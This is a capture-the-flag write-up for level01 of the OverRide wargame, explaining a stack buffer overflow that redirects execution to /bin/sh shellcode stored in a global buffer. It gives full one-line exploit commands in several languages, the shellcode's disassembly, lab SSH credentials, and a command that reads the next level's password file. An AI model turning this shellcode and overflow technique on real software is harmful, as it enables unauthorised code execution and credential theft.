# Level01: Single-Line Python Exploit

This document explains how to convert the level01 exploit into a single-line Python command.

## The Single-Line Command

**IMPORTANT:** The OverRide VM has Python 2.7, so you must use Python 2 syntax!

**For Python 2 (on the OverRide server):**
```bash
(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
```

**For Python 3 (if available):**
```bash
(python3 -c "import sys; sys.stdout.buffer.write(b'dat_wil' + b'\x90'*60 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' + b'\n' + b'A'*80 + b'\x68\xa0\x04\x08' + b'\n')"; cat) | ./level01
```

## Breakdown of the Command

### Part 1: Username (Shellcode Injection)

```python
b'dat_wil'  # Must start with this to pass verify_user_name()
```

The username must start with `"dat_wil"` because of this check:

```c
int verify_user_name(void) {
    return memcmp(a_user_name, "dat_wil", 7) != 0;
}
```

### Part 2: NOP Sled

```python
b'\x90'*60  # 60 bytes of NOP instructions
```

**Why NOPs?**
- Provides a landing zone for our return address
- Even if the exact address is slightly off, execution will "slide" to the shellcode
- `\x90` is the x86 NOP (No Operation) instruction

### Part 3: Shellcode

```python
b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

This is a 23-byte shellcode that spawns `/bin/sh`.

**Disassembly:**
```asm
31 c0                xor    eax,eax        ; eax = 0
50                   push   eax            ; Push NULL terminator
68 2f 2f 73 68       push   0x68732f2f    ; Push "//sh"
68 2f 62 69 6e       push   0x6e69622f    ; Push "/bin"
89 e3                mov    ebx,esp        ; ebx = pointer to "/bin//sh"
50                   push   eax            ; Push NULL (argv[1])
53                   push   ebx            ; Push pointer to "/bin//sh" (argv[0])
89 e1                mov    ecx,esp        ; ecx = pointer to argv
b0 0b                mov    al,0xb         ; eax = 11 (execve syscall)
cd 80                int    0x80           ; Execute syscall
```

This executes: `execve("/bin//sh", ["/bin//sh", NULL], NULL)`

### Part 4: Newline (Submit Username)

```python
b'\n'  # Submit the username input
```

### Part 5: Padding

```python
b'A'*80  # 80 bytes of padding to reach the return address
```

**Why 80 bytes?**

From GDB analysis:
- Password buffer is at `[esp+0x1c]`
- Saved return address (EIP) is at offset 80 from the password buffer start
- Confirmed with pattern matching: crashed at `0x55555555` (UUUU at offset 80)

### Part 6: Return Address

```python
b'\x68\xa0\x04\x08'  # 0x0804a068 in little-endian
```

**Address calculation:**
```
a_user_name base:  0x0804a040
+ "dat_wil" (7):   0x0804a047
+ offset (33):     0x0804a068  (middle of NOP sled)
```

We jump to the middle of the NOP sled for reliability.

**Little-endian format:**
```
0x0804a068 → \x68\xa0\x04\x08
             [low byte first ... high byte last]
```

### Part 7: Newline (Submit Password)

```python
b'\n'  # Submit the password input
```

## Why `sys.stdout.buffer.write()`?

In Python 3, we need to write **binary data** (bytes), not text (strings).

**Wrong (Python 3):**
```python
print(b'dat_wil' + b'\x90'*60)  # This adds b'' wrapper and quotes!
```

**Correct (Python 3):**
```python
import sys
sys.stdout.buffer.write(b'dat_wil' + b'\x90'*60)  # Raw binary output
```

**Alternative (Python 2):**
```python
print 'dat_wil' + '\x90'*60  # Works in Python 2
```

## Memory Layout

```
Global Segment:
0x0804a040: [d][a][t][_][w][i][l][\x90][\x90]...[\x90][shellcode...] ← a_user_name[100]
            └─ 7 bytes ─┘└────── 60 bytes ──────┘└─── 23 bytes ───┘

Stack (during password input):
[esp+0x1c]:  [password buffer - 64 bytes]
[esp+0x5c]:  [padding - 16 bytes]
[esp+0x6c]:  [saved EBP - 4 bytes]
[esp+0x70]:  [saved EIP - 4 bytes] ← We overwrite this with 0x0804a068
```

## Complete Payload Structure

```
Total payload sent to stdin:

[Username Input - 91 bytes]
├─ "dat_wil"           (7 bytes)
├─ NOP sled            (60 bytes)
├─ Shellcode           (23 bytes)
└─ Newline             (1 byte)

[Password Input - 85 bytes]
├─ Padding             (80 bytes)
├─ Return address      (4 bytes)
└─ Newline             (1 byte)
```

## Alternative Formats

### Using Python 2 (Shorter)

```bash
(python2 -c 'print "dat_wil" + "\x90"*60 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" + "\n" + "A"*80 + "\x68\xa0\x04\x08"'; cat) | ./level01
```

### Using Perl

```bash
(perl -e 'print "dat_wil" . "\x90"x60 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" . "\n" . "A"x80 . "\x68\xa0\x04\x08\n"'; cat) | ./level01
```

### Using printf (Bash)

```bash
(printf "dat_wil\x90\x90\x90...(60 times)...\x31\xc0...\n"; printf "A%.0s" {1..80}; printf "\x68\xa0\x04\x08\n"; cat) | ./level01
```

## Testing the Exploit

### Testing on the OverRide Server

**Method 1: SSH and run the exploit on the server**
```bash
ssh level01@192.168.44.139 -p 4242
# Password: uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL

# Then run:
(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01
```

**Output:**
```
level02
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

**Method 2: One-liner with sshpass (from your local machine)**
```bash
sshpass -p 'uSq2ehEGT6c9S24zbshexZQBXUGrncxn5sD5QfGL' ssh -o StrictHostKeyChecking=no level01@192.168.44.139 -p 4242 '(python -c "print \"dat_wil\" + \"\\x90\"*60 + \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\" + \"\\n\" + \"A\"*80 + \"\\x68\\xa0\\x04\\x08\""; echo "whoami"; echo "cat /home/users/level02/.pass") | ./level01'
```

## Troubleshooting

### Issue: "Segmentation fault"

**Possible causes:**
1. Wrong return address
2. Wrong offset (not 80 bytes)
3. Shellcode corrupted

**Solution:** Verify addresses in GDB:
```bash
gdb ./level01
break main
run
p &a_user_name  # Should be 0x0804a040
```

### Issue: "nope, incorrect username..."

**Cause:** Username doesn't start with "dat_wil"

**Solution:** Make sure the first 7 bytes are exactly `dat_wil`

### Issue: Shell spawns but immediately exits

**Cause:** Missing `cat` to keep stdin open

**Solution:** Always use `(exploit; cat) | ./level01`

## Summary

The single-line exploit:
1. Sends username: `"dat_wil" + NOP sled + shellcode`
2. Sends password: `padding + return address`
3. Overwrites saved EIP with address pointing to NOP sled
4. Execution slides through NOPs to shellcode
5. Shellcode spawns `/bin/sh`
6. `cat` keeps the shell interactive

**Key insight:** We use the global buffer to store shellcode (bypassing NX on stack) and the stack overflow to redirect execution to it!

